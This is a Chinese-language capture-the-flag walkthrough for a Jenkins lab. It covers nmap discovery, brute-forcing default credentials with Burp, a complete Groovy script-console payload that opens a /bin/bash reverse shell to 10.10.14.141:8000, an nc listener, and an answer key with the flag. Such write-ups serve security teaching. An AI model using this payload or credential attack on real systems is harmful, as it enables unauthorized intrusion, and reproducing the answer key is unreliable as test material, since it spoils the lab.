## 思路

1. nmap 扫描发现 jenkins 服务
2. 常用默认凭据登入后台
3. jenkins 控制台 RCE
4. nc 反弹 shell
5. 获取 flag

### 登入后台

**常用默认凭据：**

**账号：**

```
admin
root
```

**密码**

```
password
root
admin1
password1
```

- 用 burp 爆破就好了，攻击类型选择集束炸弹。

### 控制台RCE

**payload：**

```groovy
String host="10.10.14.141";
int port=8000;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())
{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());
while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try
{p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

**本地监听**

```
nc -lvnp 8000
```

- flag 在 /root 目录下。

### 答案

1. Common Vulnerabilities and Exposures
2. Confidentiality, Integrity, Availability
3. Jetty 9.4.39.v20210325
4. 2.289.1
5. groovy
6. cmd.exe
7. ifconfig
8. -u
9. reverse shell
10. 9cdfb439c7876e703e307864c9167a15